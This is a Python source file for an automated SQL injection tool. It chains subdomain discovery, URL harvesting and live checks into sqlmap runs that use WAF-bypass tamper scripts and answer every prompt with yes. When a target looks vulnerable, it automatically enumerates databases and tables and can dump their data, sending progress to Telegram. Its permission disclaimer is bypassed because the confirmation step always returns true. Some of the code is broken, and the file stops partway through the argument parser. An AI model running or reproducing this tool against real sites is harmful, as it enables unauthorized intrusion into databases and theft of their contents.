#!/usr/bin/env python3
"""
SQLInjectionScanner (Python Version)
Automated SQL Injection discovery & exploitation tool
"""

import os
import sys
import re
import time
import requests
import subprocess
import argparse
import json
from datetime import datetime
from atlas_integrator import find_best_tampers, sqlmap_with_tampers
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote_plus
import argparse
import shutil

# Import colorama for cross-platform colored terminal text
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)  # Initialize colorama with autoreset to True
    COLORS_ENABLED = True
except ImportError:
    # Create mock color objects if colorama is not installed
    class MockColor:
        def __getattr__(self, name):
            return ''
    Fore = MockColor()
    Back = MockColor()
    Style = MockColor()
    COLORS_ENABLED = False

# Environment
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# --- Get Base Directory of the script ---
# This helps locate sibling directories like 'tamper', 'results', etc.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TAMPER_DIR = os.path.join(SCRIPT_DIR, "tamper")
RESULTS_BASE_DIR = os.path.join(SCRIPT_DIR, "results")

# --- Color Functions ---
def info(msg):
    """Print info message in blue"""
    print(f"{Fore.BLUE}[*] {msg}{Style.RESET_ALL}")

def success(msg):
    """Print success message in green"""
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

def warning(msg):
    """Print warning message in yellow"""
    print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")

def error(msg):
    """Print error message in red"""
    print(f"{Fore.RED}[ERROR] {msg}{Style.RESET_ALL}")

def critical(msg):
    """Print critical error message in red with bright background"""
    print(f"{Fore.WHITE}{Back.RED}[CRITICAL] {msg}{Style.RESET_ALL}")

def vulnerable(msg):
    """Print vulnerability message in bright red"""
    print(f"{Fore.RED}{Style.BRIGHT}[VULNERABLE] {msg}{Style.RESET_ALL}")

def header(msg):
    """Print header in cyan with underline"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{msg}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * len(msg)}{Style.RESET_ALL}")

def send_telegram(message, log_file=None):
    """Send a message to Telegram channel if configured
    
    Args:
        message: The message to send
        log_file: Optional path to a log file where the message will also be logged
    
    Returns:
        bool: True if message was sent successfully, False otherwise
    """
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    
    # Always log to console
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] NOTIFICATION: {message}{Style.RESET_ALL}")
    
    # Log to file if specified
    if log_file:
        try:
            with open(log_file, 'a') as f:
                f.write(f"[{timestamp}] {message}\n")
        except IOError as e:
            print(f"{Fore.RED}[ERROR] Could not write to log file {log_file}: {e}{Style.RESET_ALL}")
    
    # Return if not configured
    if not bot_token or not chat_id:
        return False
        
    message = message.replace('"', '\\"')  # Escape double quotes for shell
    
    # Use requests instead of subprocess for better error handling
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={
                "chat_id": chat_id,
                "text": message
            },
            timeout=10
        )
        
        if response.status_code == 200:
            return True
        else:
            print(f"{Fore.YELLOW}[WARN] Telegram notification failed with status code {response.status_code}: {response.text}{Style.RESET_ALL}")
            return False
            
    except requests.RequestException as e:
        print(f"{Fore.YELLOW}[WARN] Telegram notification failed: {e}{Style.RESET_ALL}")
        return False

def check_tools(required_tools=None):
    """Check if required tools are installed
    
    Args:
        required_tools: List of tools to check, defaults to [subfinder, httpx, sqlmap]
        optional_tools: List of tools that are optional
        
    Returns:
        Tuple of (success, missing_tools)
    """
    if required_tools is None:
        required_tools = ["subfinder", "httpx", "sqlmap"]
    
    # These tools are helpful but not required
    optional_tools = ["waybackurls", "gau"]
        
    missing_tools = []
    versions = {}
    
    for tool in required_tools:
        try:
            if tool == "sqlmap":
                # Special handling for sqlmap to get version
                result = subprocess.run([tool, "--version"], capture_output=True, text=True)
                if result.returncode == 0:
                    version_match = re.search(r"(\d+\.\d+\.\d+[^\s]*)", result.stdout)
                    if version_match:
                        versions[tool] = version_match.group(1)
                    else:
                        versions[tool] = "unknown version"
                else:
                    missing_tools.append(tool)
            else:
                # Just check if tool exists
                result = subprocess.run(["which", tool], capture_output=True, text=True)
                if result.returncode == 0:
                    versions[tool] = "found"
                else:
                    missing_tools.append(tool)
        except Exception:
            missing_tools.append(tool)
            versions[tool] = "unknown version"
    
    # Check optional tools and warn if missing
    missing_optional = []
    for tool in optional_tools:
        try:
            result = subprocess.run(["which", tool], capture_output=True, text=True)
            if result.returncode == 0:
                versions[tool] = "found"
            else:
                missing_optional.append(tool)
        except Exception:
            missing_optional.append(tool)
    
    if missing_tools:
        print(f"{Fore.RED}[ERROR] Missing required tools: {' '.join(missing_tools)}{Style.RESET_ALL}")
        return False, missing_tools
    else:
        print(f"{Fore.GREEN}[+] All required tools are installed:{Style.RESET_ALL}")
        for tool, version in versions.items():
            print(f"  - {tool}: {version if len(version) < 50 else 'found'}")
        
        if missing_optional:
            print(f"{Fore.YELLOW}[!] Some optional tools are not installed: {' '.join(missing_optional)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Functionality may be limited, but core features will work.{Style.RESET_ALL}")
        
        return True, []

def prompt_confirm():
    print(f"{Fore.YELLOW}{Style.BRIGHT}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT} SQL INJECTION TESTING TOOL - DISCLAIMER{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} This script will perform reconnaissance and SQL Injection tests.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} Ensure you have explicit permission to test the target domain!{Style.RESET_ALL}")
    print(f"{Fore.RED} Unauthorized testing may be illegal in your jurisdiction.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}{'=' * 60}{Style.RESET_ALL}")
    # Skip confirmation and automatically proceed
    print(f"{Fore.GREEN}[+] Running in automatic mode - no confirmation required{Style.RESET_ALL}")
    return True

def run_command(command, cwd=None, timeout=None, retry_count=1, retry_delay=2, show_output=True):
    """
    Run a command with subprocess and handle retries, with real-time output
    
    Args:
        command: Command to run (list or string)
        cwd: Working directory
        timeout: Timeout in seconds
        retry_count: Number of times to retry if command fails
        retry_delay: Delay between retries in seconds
        show_output: Whether to show output in real-time
        
    Returns:
        Tuple of (stdout, stderr, return_code)
    """
    for attempt in range(retry_count):
        try:
            # If command is a string, split it into a list
            if isinstance(command, str):
                cmd_list = command.split()
            else:
                cmd_list = command
                
            # Use different approach for real-time output
            if show_output:
                process = subprocess.Popen(
                    cmd_list,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,  # Merge stderr into stdout for simpler reading
                    text=True,
                    bufsize=1,  # Line buffered
                    universal_newlines=True,
                    cwd=cwd
                )
                
                # Collect output for return value
                all_output = []
                last_status_time = time.time()
                
                # Read output in real-time
                for line in iter(process.stdout.readline, ''):
                    all_output.append(line)
                    
                    # Only print non-empty lines
                    if line.strip():
                        print(line.rstrip())
                    
                    # Periodically print a status message for long-running processes
                    current_time = time.time()
                    if current_time - last_status_time > 15:  # Status update every 15 seconds
                        info(f"Still working... ({int(current_time - last_status_time)} seconds since last update)")
                        last_status_time = current_time
                    
                    # Flush stdout to ensure real-time display
                    sys.stdout.flush()
                
                # Wait for process to complete
                process.wait(timeout=timeout)
                stdout = ''.join(all_output)
                stderr = ''
            else:
                # Original approach without real-time output
                process = subprocess.Popen(
                    cmd_list,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=cwd
                )
                
                stdout, stderr = process.communicate(timeout=timeout)
            
            if process.returncode == 0:
                return stdout, stderr, process.returncode
                
            # If we get here, the command failed
            if attempt < retry_count - 1:
                warning(f"Command failed, retrying in {retry_delay}s... ({attempt+1}/{retry_count})")
                time.sleep(retry_delay)
            
        except subprocess.TimeoutExpired:
            process.kill()
            error(f"Command timed out after {timeout}s")
            return "", f"Command timed out after {timeout}s", 1
            
        except Exception as e:
            if attempt < retry_count - 1:
                error(f"Error running command: {e}, retrying in {retry_delay}s... ({attempt+1}/{retry_count})")
                time.sleep(retry_delay)
            else:
                return "", str(e), 1
    
    # If we get here, all retries failed
    return stdout, stderr, process.returncode

def collect_subdomains(domain, out_file, timeout=300, retry_count=2):
    """Enumerate subdomains using subfinder with timeout and retry capability
    
    Args:
        domain: Target domain to enumerate
        out_file: Output file to save results
        timeout: Maximum time to allow subfinder to run (seconds)
        retry_count: Number of retry attempts on failure
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Enumerating subdomains for {domain}...")
    
    # Create command as list for better escaping
    command = ["subfinder", "-d", domain, "-o", out_file]
    
    # Track start time for performance reporting
    start_time = time.time()
    
    result = run_command(command, timeout=timeout, retry_count=retry_count)
    if result: 
         elapsed = time.time() - start_time
         print(f"[+] Subdomain enumeration complete in {elapsed:.2f} seconds. Saved to {out_file}")
         
         # Verify output file was created and has content
         if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
             return True
         else:
             # File is empty or doesn't exist
             print(f"[WARN] Subfinder completed but output file is empty or missing")
             # Create a file with at least the target domain
             with open(out_file, 'w') as f:
                 f.write(f"{domain}\n")
             return True
    else:
        print(f"[ERROR] subfinder command failed. Using base domain {domain} as fallback")
        # Create a fallback file with just the base domain
        with open(out_file, 'w') as f:
            f.write(f"{domain}\n")
        return False

def collect_urls(sub_file, out_file):
    print("[*] Collecting URLs via gau...")
    try:
        with open(sub_file, 'r') as f_in, open(out_file, 'w') as f_out:
            # Start cat process
            cat_proc = subprocess.Popen(["cat", sub_file], stdout=subprocess.PIPE, text=True)
            
            # Start gau process, taking input from cat
            # Note: gau --threads is often deprecated/ignored; check `gau --help`
            # If --o is supported by your gau version, it might be simpler:
            # gau_command = ["gau", "--threads", "20", "--o", out_file]
            # process = subprocess.run(gau_command, stdin=cat_proc.stdout, text=True, check=True)
            # cat_proc.wait() # Wait for cat to finish
            
            # If --o isn't reliable or you prefer explicit piping:
            gau_command = ["gau", "--threads", "20"]
            gau_proc = subprocess.Popen(gau_command, stdin=cat_proc.stdout, stdout=f_out, stderr=subprocess.PIPE, text=True)
            
            # Allow cat_proc to receive a SIGPIPE if gau_proc exits.
            cat_proc.stdout.close()
            
            # Wait for gau to finish and capture stderr
            stderr_output = gau_proc.communicate()[1]
            
            # Check return codes
            cat_retcode = cat_proc.wait()
            gau_retcode = gau_proc.returncode
            
            if cat_retcode != 0:
                 print(f"[WARN] cat process exited with code {cat_retcode} for file {sub_file}")
                 # Continue anyway, maybe the file was empty?

            if gau_retcode == 0:
                # Check if output file actually contains data
                if os.path.getsize(out_file) > 0:
                    print(f"[+] URL collection complete. Saved raw URLs to {out_file}")
                    return True
                else:
                    print(f"[WARN] gau ran successfully but produced an empty output file: {out_file}")
                    return False # Treat as failure if empty
            else:
                print(f"[ERROR] gau command failed with return code {gau_retcode}.")
                if stderr_output:
                     print(f"Stderr: {stderr_output.strip()}")
                return False

    except FileNotFoundError as e:
        # Could be cat, gau, or the input/output files
        print(f"[ERROR] File not found during URL collection: {e}")
        return False
    except IOError as e:
        print(f"[ERROR] I/O error during URL collection: {e}")
        return False
    except Exception as e:
        # Catch other potential exceptions
        print(f"[ERROR] An unexpected error occurred during URL collection: {e}")
        return False

def filter_urls(url_file, filtered_file):
    print(f"[*] Filtering URLs from {url_file} for parameters...")
    count = 0
    try:
        with open(url_file, 'r') as infile, open(filtered_file, 'w') as outfile:
            for line in infile:
                if '?' in line and '=' in line: 
                    outfile.write(line)
                    count += 1
        print(f"[+] Found {count} URLs with parameters. Saved to {filtered_file}")
        return count
    except FileNotFoundError:
        print(f"[ERROR] Input URL file not found: {url_file}")
        return 0
    except IOError as e:
        print(f"[ERROR] Failed reading/writing URL files: {e}")
        return 0

def check_live_urls(url_file, live_file):
    print("[*] Checking which URLs are live with httpx...")
    command = [
        "httpx", "-l", url_file,
        "-silent", "-status-code", "-mc", "200,201,204,301,302,307,308",
        "-threads", "50", 
        "-o", live_file
    ]
    if run_command(command):
        try:
            with open(live_file, 'r') as f:
                live_count = sum(1 for line in f if line.strip())
            print(f"[+] Found {live_count} live URLs with parameters. Saved to {live_file}")
            return live_count
        except FileNotFoundError:
             print(f"[INFO] httpx completed but output file {live_file} not found or empty.")
             return 0
        except IOError as e:
            print(f"[ERROR] Failed to read live URL file {live_file}: {e}")
            return 0
    else:
        print("[ERROR] httpx command failed.")
        return 0

def scan_with_sqlmap(live_urls_file, output_dir, tamper_scripts=None, level=1, risk=1, 
                     threads=10, verbose=False, prefix=None, suffix=None, auth_type=None, 
                     auth_cred=None, cookie=None, proxy=None, proxy_file=None, headers=None,
                     auto_enum_dbs=True, get_dbs=True, get_tables=False, get_columns=False, dump_data=False,
                     auto_waf=False, report_format=None, timeout=None):
    """Runs SQLMap with specified options.
    
    Args:
        live_urls_file: File containing URLs to scan
        output_dir: Directory to store results
        tamper_scripts: Comma-separated list of tamper scripts to use
        level: SQLMap scan level (1-5)
        risk: SQLMap risk level (1-3)
        threads: Number of concurrent threads
        verbose: Enable verbose output
        prefix, suffix: SQL injection prefix/suffix
        auth_type, auth_cred, cookie: Authentication options
        proxy, proxy_file: Proxy settings
        get_dbs, get_tables, get_columns, dump_data: DB enumeration flags
        auto_waf: Automatic WAF detection and bypass
        report_format: Output report format (csv, html, json, etc.)
        timeout: Timeout in seconds for the sqlmap process
        auto_enum_dbs: Automatically enumerate databases when vulnerabilities are found
    
    Returns:
        dict: Dictionary with scan results including vulnerabilities found
    """
    """Runs SQLMap with specified options."""
    print(f"[*] Starting SQLMap scan on {live_urls_file}")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    sqlmap_log_file = os.path.join(output_dir, f"sqlmap_log_{timestamp}.txt")
    
    # Prepare for WAF detection if enabled
    detected_tampers = []
    if auto_waf:
        try:
            # Read the first URL from the file to detect WAF
            with open(live_urls_file, 'r') as f:
                first_url = f.readline().strip()
                if first_url:
                    print(f"[*] Testing for WAF presence using {first_url}")
                    
                    # Check if the URL likely has SQL injection parameters (to focus on the most promising ones)
                    likely_sql_params = ['id', 'cat', 'category', 'product', 'item', 'article', 'news', 'page', 'user', 'username', 'uid']
                    parsed_url = urlparse(first_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    # Check if any common SQL injection parameters are in the URL
                    has_likely_sql_param = False
                    for param in query_params:
                        if param.lower() in likely_sql_params:
                            has_likely_sql_param = True
                            print(f"[+] Found likely SQL injection parameter: {param}")
                    
                    custom_headers = {}
                    if headers:
                        # Convert header string to dictionary
                        for header_line in headers.split('\n'):
                            if ':' in header_line:
                                key, value = header_line.split(':', 1)
                                custom_headers[key.strip()] = value.strip()
                    
                    # Detect WAF and get recommended tampers
                    all_detected_tampers = find_best_tampers(first_url, headers=custom_headers)
                    # Select only the top 3 most effective tampers to keep scanning fast
                    detected_tampers = all_detected_tampers[:3] if len(all_detected_tampers) > 3 else all_detected_tampers
                    print(f"[+] WAF detection complete. Using top tampers: {', '.join(detected_tampers)}")
                    
                    # If user specified tampers, prioritize those over auto-detected ones
                    if tamper_scripts:
                        user_tampers = tamper_scripts.split(',')
                        # Use user-specified tampers first, then fill remaining slots with auto-detected ones
                        final_tampers = []
                        for t in user_tampers:
                            if len(final_tampers) < 3:
                                final_tampers.append(t)
                        
                        # Add some auto-detected tampers if we have room
                        for t in detected_tampers:
                            if t not in final_tampers and len(final_tampers) < 3:
                                final_tampers.append(t)
                        
                        detected_tampers = final_tampers
                        print(f"[+] Using optimized tampers: {', '.join(detected_tampers)}")
        except Exception as e:
            print(f"[!] Error during WAF detection: {e}")
            print(f"[*] Continuing with user-specified tampers if any")
    
    # We'll build the command below in the try block
    if proxy_file:
        proxy_file_path = os.path.abspath(proxy_file) # Ensure path is absolute
        if os.path.isfile(proxy_file_path):
            command.extend(["--proxy-file", proxy_file_path])
        else:
            print(f"[WARN] Proxy file not found: {proxy_file_path}. Ignoring --proxy-file.")
    try:
        sqlmap_log_file = os.path.join(output_dir, f"sqlmap_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        # Build command with proper argument formatting
        # Add --answers to automatically respond to all prompts with 'Y' for fully automatic operation
        cmd = ["sqlmap", "-m", live_urls_file, "--batch", "--answers=Y", "--level", str(level), "--risk", str(risk),
               "--threads", str(threads)]
        
        # Add options for database enumeration
        if get_dbs:
            cmd.append("--dbs")
        if get_tables:
            cmd.append("--tables")
        if get_columns:
            cmd.append("--columns")
        if dump_data:
            cmd.append("--dump")
        
        # Add verbose flag if requested
        if verbose:
            cmd.append("-v")
            cmd.append("3")
            
        # Add tamper scripts if provided (either from auto-waf or user), limiting to max 3 for speed
        tamper_to_use = None
        if detected_tampers:
            # Limit to 3 tamper scripts for faster execution
            limited_tampers = detected_tampers[:3] if len(detected_tampers) > 3 else detected_tampers
            tamper_to_use = ",".join(limited_tampers)
            print(f"[*] Using optimized tamper scripts for better performance: {tamper_to_use}")
        elif tamper_scripts:
            # If user specified tampers directly, limit to 3 at most
            user_tampers = tamper_scripts.split(",")
            limited_tampers = user_tampers[:3] if len(user_tampers) > 3 else user_tampers
            tamper_to_use = ",".join(limited_tampers)
            print(f"[*] Using user-specified tamper scripts (limited to 3): {tamper_to_use}")
            
        if tamper_to_use:
            cmd.append("--tamper")
            cmd.append(tamper_to_use)
            
        # Add other optional parameters if provided
        if prefix:
            cmd.append("--prefix")
            cmd.append(prefix)
        if suffix:
            cmd.append("--suffix")
            cmd.append(suffix)
        if auth_type and auth_cred:
            cmd.append("--auth-type")
            cmd.append(auth_type)
            cmd.append("--auth-cred")
            cmd.append(auth_cred)
        if cookie:
            cmd.append("--cookie")
            cmd.append(cookie)
        if proxy:
            cmd.append("--proxy")
            cmd.append(proxy)
        if proxy_file:
            cmd.append("--proxy-file")
            cmd.append(proxy_file)
        if headers:
            cmd.append("--headers")
            cmd.append(headers)
            
        # Add output directory
        cmd.append("--output-dir")
        cmd.append(output_dir)
            
        # Add report format if specified (and supported)
        if report_format:
            # Check if the format is txt (widely supported)
            if report_format.lower() == "txt":
                cmd.append("--text-output")
            # You can add other supported formats here as needed
            
        # Start SQLMap scan
        info(f"Running SQLmap command: {' '.join(cmd)}")
        info(f"SQLmap output will be logged to: {sqlmap_log_file}")
        
        tamper_msg = tamper_to_use if tamper_to_use else "none"
        send_telegram(f"Starting SQLMap scan on {live_urls_file}. Log: {sqlmap_log_file}. Tamper: {tamper_msg}")
        
        # Call sqlmap and capture output with real-time feedback
        stdout, stderr, return_code = run_command(cmd, show_output=True)
        if return_code != 0:
            error(f"SQLMap scan failed with return code {return_code}.")
            send_telegram(f"SQLMap scan failed for {live_urls_file}. Check system.")
            return {"vulnerable_found": False, "vulnerable_urls": []}
            
        # Save output to log file
        with open(sqlmap_log_file, 'w') as f:
            f.write(stdout)
            if stderr:
                f.write("\n\nSTDERR:\n")
                f.write(stderr)
                
        success(f"SQLmap scan complete. Full log: {sqlmap_log_file}")
        
        # Parse sqlmap output for vulnerable URLs
        try:
            with open(sqlmap_log_file, 'r') as f:
                log_content = f.read()
                
            # Check if SQLMap found vulnerabilities
            vulnerable_found = False
            vulnerable_urls = []
            
            if ("sqlmap identified the following injection point(s)" in log_content) or \
                    ("Parameter:" in log_content and "Type:" in log_content and "Title:" in log_content) or \
                    ("might be injectable" in log_content):
                    vulnerable("SQLMap found potential vulnerabilities! Check the log.")
                    
                    # Parse log for vulnerable URLs and parameters
                    for line in log_content.split('\n'):
                        if "Parameter:" in line and "Type:" in line:
                            # Try to extract the URL from nearby lines
                            url_marker = "URL: "
                            for i in range(-5, 0):  # Look at previous 5 lines
                                try:
                                    url_line_index = log_content.split('\n').index(line) + i
                                    if url_line_index >= 0 and url_marker in log_content.split('\n')[url_line_index]:
                                        url = log_content.split('\n')[url_line_index].split(url_marker)[1].strip()
                                        vulnerable_urls.append(url)
                                        break
                                except (ValueError, IndexError):
                                    continue
                    
                    # Write vulnerable URLs to a file
                    if vulnerable_urls:
                        vulnerable_urls_file = os.path.join(output_dir, "vulnerable_urls.txt")
                        with open(vulnerable_urls_file, 'w') as f:
                            for url in vulnerable_urls:
                                f.write(f"{url}\n")
                        success(f"Found {len(vulnerable_urls)} vulnerable URLs, saved to {vulnerable_urls_file}")
                    
                    send_telegram(f"SQLMap found potential vulnerabilities for {live_urls_file}! Check log: {sqlmap_log_file}")
                    vulnerable_found = True

            if not vulnerable_found:
                 header("SQL INJECTION TEST RESULTS")
                 warning("No SQL injection points were found. This site is not injectable or WAF is blocking the attacks.")
                 # Don't notify telegram if nothing found unless verbose mode is added later
                 # send_telegram(f"SQLMap scan finished for {live_urls_file}. No vulnerabilities reported.")
            elif auto_enum_dbs and vulnerable_urls:
                 # Automatically enumerate databases if vulnerable URLs were found
                 print("\n")
                 header("AUTOMATIC DATABASE ENUMERATION")
                 info(f"{Style.BRIGHT}Vulnerabilities found! Automatically enumerating databases...")
                 vulnerable_urls_file = os.path.join(output_dir, "vulnerable_urls.txt")
                 
                 # Run database enumeration directly
                 databases = run_dbs_enum(vulnerable_urls_file, output_dir, tamper_scripts, level, risk, 
                            prefix, suffix, auth_type, auth_cred, cookie, proxy, proxy_file, 
                            threads, verbose, True)  # True = return databases found

        except IOError as e:
             error(f"Could not read SQLmap log file {sqlmap_log_file}: {e}")
             send_telegram(f"SQLMap scan finished for {live_urls_file}, but couldn't read log.")
             return {"vulnerable_found": False, "vulnerable_urls": []}

    except FileNotFoundError:
         critical("Cannot find sqlmap executable.")
         send_telegram("Error: Cannot find sqlmap executable.")
         return {"vulnerable_found": False, "vulnerable_urls": []}
    
    return {"vulnerable_found": vulnerable_found, "vulnerable_urls": vulnerable_urls}


def run_dbs_enum(vulnerable_urls_file, output_dir, tamper_scripts=None, level=1, risk=1,
                  prefix=None, suffix=None, auth_type=None, auth_cred=None, cookie=None,
                  proxy=None, proxy_file=None, threads=5, verbose=False, return_dbs=False):
    """
    Run automatic database enumeration on vulnerable URLs
    
    Args:
        vulnerable_urls_file: File with list of vulnerable URLs
        output_dir: Directory to store results
        Other parameters match those in scan_with_sqlmap
    """
    header("AUTOMATIC DATABASE ENUMERATION")
    
    # Create a results subdirectory for database enumeration
    dbs_output_dir = os.path.join(output_dir, "database_enum")
    os.makedirs(dbs_output_dir, exist_ok=True)
    
    # Count the number of URLs to process
    with open(vulnerable_urls_file, 'r') as f:
        url_count = sum(1 for _ in f)
    
    info(f"Starting database enumeration on {url_count} vulnerable URLs...")
    send_telegram(f"Starting automatic database enumeration on {url_count} vulnerable URLs.")
    
    # Build sqlmap command for database enumeration
    cmd = ["sqlmap", "-m", vulnerable_urls_file, "--batch", "--dbs"]
    
    # Add options
    if level: cmd.extend(["--level", str(level)])
    if risk: cmd.extend(["--risk", str(risk)])
    if threads: cmd.extend(["--threads", str(threads)])
    if tamper_scripts: cmd.extend(["--tamper", tamper_scripts])
    if prefix: cmd.extend(["--prefix", prefix])
    if suffix: cmd.extend(["--suffix", suffix])
    if auth_type and auth_cred:
        cmd.extend(["--auth-type", auth_type])
        cmd.extend(["--auth-cred", auth_cred])
    if cookie: cmd.extend(["--cookie", cookie])
    if proxy: cmd.extend(["--proxy", proxy])
    if proxy_file: cmd.extend(["--proxy-file", proxy_file])
    if verbose: cmd.extend(["-v"])
    
    # Add output directory
    cmd.extend(["--output-dir", dbs_output_dir])
    
    # Run sqlmap with real-time output
    info(f"Running database enumeration command: {' '.join(cmd)}")
    info(f"Output will be saved to: {dbs_output_dir}")
    
    stdout, stderr, return_code = run_command(cmd, show_output=True)
    if return_code != 0:
        error(f"Database enumeration failed.")
        send_telegram(f"Database enumeration failed.")
        return
    
    # Check for found databases
    dbs_found = []
    for d in os.listdir(dbs_output_dir):
        if os.path.isdir(os.path.join(dbs_output_dir, d)):
            # Exclude output directory itself and common non-db directories
            if d not in ["output", "scans", "logs"]:
                dbs_found.append(d)
    
    # Save the list of found databases
    dbs_file = os.path.join(dbs_output_dir, "databases.txt")
    with open(dbs_file, 'w') as f:
        for db in dbs_found:
            f.write(f"{db}\n")
    
    success(f"Database enumeration completed successfully!")
    success(f"Results saved to {dbs_output_dir}")
    
    if dbs_found:
        print("\n[+] Databases found:")
        for i, db in enumerate(dbs_found, 1):
            print(f"{Fore.GREEN}    {i}. {db}{Style.RESET_ALL}")
        success(f"Database list saved to {dbs_file}")
        
        send_telegram(f"Database enumeration completed! Found {len(dbs_found)} databases: {', '.join(dbs_found)}")
        
        # If tables were found, try to enumerate tables for each database
        if len(dbs_found) > 0 and not return_dbs:
            for db in dbs_found:
                enum_tables_for_db(vulnerable_urls_file, output_dir, db, tamper_scripts, level, risk,
                               prefix, suffix, auth_type, auth_cred, cookie, proxy, proxy_file, threads, verbose)
    else:
        warning("No databases were found or enumeration was incomplete.")
        send_telegram("Database enumeration completed, but no databases were found.")
    
    if return_dbs:
        return dbs_found


def enum_tables_for_db(vulnerable_urls_file, output_dir, db_name, tamper_scripts=None, level=1, risk=1,
                  prefix=None, suffix=None, auth_type=None, auth_cred=None, cookie=None,
                  proxy=None, proxy_file=None, threads=5, verbose=False):
    """
    Enumerate tables for a specific database
    
    Args:
        vulnerable_urls_file: File with list of vulnerable URLs
        output_dir: Directory to store results
        db_name: Name of the database to enumerate tables for
        Other parameters match those in scan_with_sqlmap
    """
    header(f"ENUMERATING TABLES FOR DATABASE: {db_name}")
    
    # Create a results subdirectory for table enumeration
    tables_output_dir = os.path.join(output_dir, "database_enum", db_name, "tables")
    os.makedirs(tables_output_dir, exist_ok=True)
    
    info(f"Starting table enumeration for database: {db_name}")
    send_telegram(f"Starting table enumeration for database: {db_name}")
    
    # Build sqlmap command for table enumeration
    cmd = ["sqlmap", "-m", vulnerable_urls_file, "--batch", "--tables"]
    
    # Add database
    cmd.extend(["-D", db_name])
    
    # Add options
    if level: cmd.extend(["--level", str(level)])
    if risk: cmd.extend(["--risk", str(risk)])
    if threads: cmd.extend(["--threads", str(threads)])
    if tamper_scripts: cmd.extend(["--tamper", tamper_scripts])
    if prefix: cmd.extend(["--prefix", prefix])
    if suffix: cmd.extend(["--suffix", suffix])
    if auth_type and auth_cred:
        cmd.extend(["--auth-type", auth_type])
        cmd.extend(["--auth-cred", auth_cred])
    if cookie: cmd.extend(["--cookie", cookie])
    if proxy: cmd.extend(["--proxy", proxy])
    if proxy_file: cmd.extend(["--proxy-file", proxy_file])
    if verbose: cmd.extend(["-v"])
    
    # Add output directory
    cmd.extend(["--output-dir", tables_output_dir])
    
    # Run sqlmap with real-time output
    info(f"Running table enumeration command: {' '.join(cmd)}")
    info(f"Output will be saved to: {tables_output_dir}")
    
    stdout, stderr, return_code = run_command(cmd, show_output=True)
    if return_code != 0:
        error(f"Table enumeration failed.")
        send_telegram(f"Table enumeration for {db_name} failed.")
        return
    
    # Parse output to find tables
    tables_found = []
    try:
        # Extract tables from directory structure or output
        tables_file = os.path.join(tables_output_dir, "tables.txt")
        tables_content = stdout
        
        # Parse tables from output
        table_section = False
        for line in tables_content.split('\n'):
            if db_name.lower() in line.lower() and 'tables:' in line.lower():
                table_section = True
                continue
            
            if table_section and line.strip() and not line.startswith('['):
                # This is likely a table name
                table_name = line.strip()
                if table_name not in tables_found:
                    tables_found.append(table_name)
            
            # End table section when we hit a blank line
            if table_section and not line.strip():
                table_section = False
        
        # Save tables to file
        with open(tables_file, 'w') as f:
            for table in tables_found:
                f.write(f"{table}\n")
        
        if tables_found:
            success(f"Found {len(tables_found)} tables in database {db_name}")
            print("\n[+] Tables found:")
            for i, table in enumerate(tables_found, 1):
                print(f"{Fore.GREEN}    {i}. {table}{Style.RESET_ALL}")
            success(f"Table list saved to {tables_file}")
            
            send_telegram(f"Table enumeration completed for database {db_name}! Found {len(tables_found)} tables.")
            
            # Optionally, continue to enumerate columns for each table
            # This could be expanded in a future enhancement
        else:
            warning(f"No tables found in database {db_name} or enumeration was incomplete.")
            send_telegram(f"Table enumeration completed for database {db_name}, but no tables were found.")
    
    except Exception as e:
        error(f"Error parsing table enumeration results: {e}")
if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='SqlQ - Advanced SQL Injection Discovery & Testing Tool')
    parser.add_argument('-u', '--url', '--domain', '--target', dest='domain', help='Target domain/URL to scan')
    parser.add_argument('-o', '--output', help='Output directory')
    parser.add_argument('--skip-recon', action='store_true', help='Skip reconnaissance phase')
    parser.add_argument('--max-urls', type=int, help='Maximum number of URLs to scan')
    parser.add_argument('--vulnerable-file', help='File containing already discovered vulnerable URLs')
    
    # Enhanced scanning options
    parser.add_argument('--full', action='store_true', help='Run full scan with all enhanced features')
    parser.add_argument('--api-scan', action='store_true', help='Scan for API endpoints')
    parser.add_argument('--login-scan', action='store_true', help='Scan for login forms')
    parser.add_argument('--post-scan', action='store_true', help='Generate and test POST requests')
    parser.add_argument('--js-scan', action='store_true', help='Extract endpoints from JavaScript files')
    
    # SQLMap options
    parser.add_argument('--level', type=int, default=1, help='SQLMap detection level (1-5)')
    parser.add_argument('--risk', type=int, default=1, help='SQLMap risk level (1-3)')
    parser.add_argument('--tamper', help='SQLMap tamper script(s)')
    parser.add_argument('--threads', type=int, default=10, help='Number of concurrent threads')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--prefix', help='Injection payload prefix')
    parser.add_argument('--suffix', help='Injection payload suffix')
    parser.add_argument('--auto-waf', action='store_true', help='Auto-detect WAF and use appropriate tamper scripts')
    
    # Authentication options
    parser.add_argument('--auth-type', help='HTTP authentication type (Basic, Digest, NTLM)')
